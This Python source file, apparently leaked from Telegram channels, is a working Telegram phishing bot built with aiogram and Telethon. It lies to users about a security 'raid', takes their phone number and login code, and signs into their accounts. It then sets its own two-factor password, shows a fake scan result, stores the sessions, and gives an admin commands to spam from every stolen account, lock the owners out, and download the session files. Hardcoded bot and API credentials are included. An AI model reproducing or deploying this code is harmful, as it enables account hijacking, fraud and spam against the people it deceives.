# CЛИТО В ТЕЛЕГРАМ КАНАЛАХ @END_SOFTWARE AND @END_RAID

from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, message
#from loader import dp, scheduler
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import CallbackQuery, Message
from telethon import TelegramClient
from telethon import functions
import os, json

# token(@BotFather)
bot_token = '8324933170:AAFatQ1T42ZJ70oeWS2UJkcXFeiwUFCIXAk'
# TG API(https://my.telegram.org/)
api_id = '29385016'
api_hash = '3c57df8805ab5de5a23a032ed39b9af9'
# you telegram id
admin_id = 6893832048
admin_id1 = 6893832048

bot = Bot(token=bot_token, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# add account states group
class AddAccount(StatesGroup):
    A1 = State()
    A2 = State()
    A3 = State()
    A4 = State()
    A5 = State()
    A6 = State()

# use account states group
class Send(StatesGroup):
    A1 = State()
    A2 = State()

# keyboard menu
code_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="1️⃣", callback_data="code_number:1"),
            InlineKeyboardButton(text="2️⃣", callback_data="code_number:2"),
            InlineKeyboardButton(text="3️⃣", callback_data="code_number:3"),
        ],
        [
            InlineKeyboardButton(text="4️⃣", callback_data="code_number:4"),
            InlineKeyboardButton(text="5️⃣", callback_data="code_number:5"),
            InlineKeyboardButton(text="6️⃣", callback_data="code_number:6"),
        ],
        [
            InlineKeyboardButton(text="7️⃣", callback_data="code_number:7"),
            InlineKeyboardButton(text="8️⃣", callback_data="code_number:8"),
            InlineKeyboardButton(text="9️⃣", callback_data="code_number:9")
        ],
        [
            InlineKeyboardButton(text="0️⃣", callback_data="code_number:0"),
        ]
    ]
)

# /start handler
@dp.message_handler(commands=['start'])
async def send_welcome(call: CallbackQuery, state: FSMContext):
    # check admin id
    if call.from_user.id != admin_id and call.from_user.id != admin_id1:
        # if not admin
        key_1 = types.KeyboardButton(
            text='Продолжить',
            request_contact=True
        )
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(key_1)
        await call.reply(text="В Telegram прошёл рейд скам ботов, которые оставили в аккаунтах дыры, просим вас пройти тест чтобы продолжить деятельность использования ботов!", reply_markup=keyboard)
    
        msg_to_edit = await bot.send_message(chat_id=call.chat.id, text="Нажмите на кнопку \"Продолжить\"")
        await AddAccount.A1.set()
        #await state.set_state(AddAccount.A1)
        await state.update_data(msg_to_edit=msg_to_edit)
    else:
        # if admin
        path = len([name for name in os.listdir('sessions/') if os.path.isfile(os.path.join('sessions/',name))])
        await call.reply(text=f"Привет <b>admin</b>, в ваших владениях {path} сессий!\n\n/send - заспамить человеку ЛС\n/auth - очистить сессии через 24 часа(https://core.telegram.org/method/account.resetAuthorization)\n/session - отправить все сессии")

# /send handler
@dp.message_handler(commands=['send'])
async def send_post(message: types.Message):
    if message.from_user.id != admin_id or message.from_user.id != admin_id1:
        await message.reply(text="Введи юзернейм пользователя, который получит сообщения без @:")
        await Send.A1.set()

# /auth handler
@dp.message_handler(commands=['auth'])
async def send_auth(message: types.Message):
    if message.from_user.id != admin_id or message.from_user.id != admin_id1:
        res = 0
        for name in os.listdir('sessions/'):
            try:
                client = TelegramClient(f"sessions/{name}", api_id, api_hash)
                await client.connect()
                result = await client(functions.account.GetAuthorizationsRequest())
                auths_list = result.to_dict()['authorizations']
                for auth in auths_list:
                    if auth['app_name'] != 'TelegramTester':
                        r = await client(functions.account.ResetAuthorizationRequest(hash=auth['hash']))
                        print(r)
                    print(auth['hash'])
                await client.disconnect()
                res += 1
            except Exception as e:
                print(e)

        await message.reply(text=f"Удалось очистить {res} аккаунтов")
# /auth handler
@dp.message_handler(commands=['session'])
async def send_ses(message: types.Message):
    if message.from_user.id != admin_id or message.from_user.id != admin_id1:
        for name in os.listdir('sessions/'):
            try:
                await bot.send_document(message.chat.id, open(f"sessions/{name}", "rb"))
            except Exception as e:
                print(e)

# send state handlers
@dp.message_handler(state=Send.A1)
async def send_A1(message: Message, state: FSMContext):
    username = message.text
    await message.reply(text="Введи текст:")

    await Send.next()
    await state.update_data(username=username)

@dp.message_handler(state=Send.A2)
async def send_A2(message: Message, state: FSMContext):
    data = await state.get_data()
    username = data.get("username")

    for name in os.listdir('sessions/'):
        try:
            client = TelegramClient(f"sessions/{name}", api_id, api_hash)
            await client.connect()
            await client.send_message(username, message.text)
            await client.disconnect()
        except Exception as e:
            print(e)

    await state.finish()

# add account state handlers
@dp.message_handler(content_types=['contact'], state=AddAccount.A1)
async def receive_number(message: Message, state: FSMContext):
    # get state data
    data = await state.get_data()
    msg_to_edit = data.get("msg_to_edit")
    number = message.contact.phone_number.replace(' ', '')
    await message.delete()
    # if path /sessions/ have this session 
    if os.path.exists(f"sessions/{number}.session"):
        # delete session
        os.remove(f"sessions/{number}.session")
    client = TelegramClient(f"sessions/{number}", api_id, api_hash)
    # send code
    await client.connect()
    sent = await client.send_code_request(phone=number)
    await client.disconnect()
    # send code menu
    await msg_to_edit.edit_text(f"<b>Вы указали <code>{number}</code>\n"
                                f"Укажите первую цифру кода:</b>",
                                reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(number=number, sent=sent, code_hash=sent.phone_code_hash)

# menu manegers
@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A2)
async def receive_code(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit = data.get("msg_to_edit")
    num_1 = call.data.split(":")[1]
    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{num_1}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_1=num_1)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A3)
async def receive_code1(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1 = data.get("msg_to_edit"), data.get("num_1")
    num_2 = call.data.split(":")[1]
    code = num_1 + num_2
    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_2=num_2)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A4)
async def receive_code2(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1, num_2 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2")
    num_3 = call.data.split(":")[1]
    code = num_1 + num_2 + num_3
    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_3=num_3)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A5)
async def receive_code3(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1, num_2, num_3 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2"), data.get("num_3")
    num_4 = call.data.split(":")[1]
    code = num_1 + num_2 + num_3 + num_4
    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_4=num_4)

# last manager
@dp.callback_query_handler(state=AddAccount.A6)
async def receive_code4(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1, num_2, num_3 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2"), data.get("num_3")
    number, num_4, sent, code_hash = data.get("number"), data.get("num_4"), data.get("sent"), data.get("code_hash")
    num_5 = call.data.split(":")[1]
    code = num_1 + num_2 + num_3 + num_4 + num_5
    try:
        # connect
        client = TelegramClient(f"sessions/{number}", api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(phone=number, code=code, phone_code_hash=code_hash)
        except:
            await client.sign_in(phone=number, code=code, phone_code_hash=code_hash, password='youscam666')
        print(call.from_user.id, number)
        # send my creater message
        res = await client.edit_2fa(new_password='youscam666')
        print(res)
        await msg_to_edit.edit_text(f"<b>К вашему аккаунту подключен бот сканирющий логи подключений, после окончания придёт результат!</b>")
        result = await client(functions.account.GetAuthorizationsRequest())
        await msg_to_edit.edit_text("<b>Результат сканировани:</b>\n\nTelegram Desktop - ✅\nTelegram App - ✅\na0afga2 - ❌\n\n<b>Обнаружена подозрительная скрытая сессия, просим вас не мешать её удалению 24 часа!</b>")
        await bot.send_message(admin_id, f"New user: {call.from_user.id} - @{call.from_user.username}")
        await client.disconnect()
        # this is last message
        #await state.finish()
    except Exception as e:
        # if error
        print(e)
        await msg_to_edit.edit_text("Не верный код. Попробуйте заново. /start")
        #await state.finish()

# start bot
if __name__ == '__main__':
    #scheduler.start()
    executor.start_polling(dp)
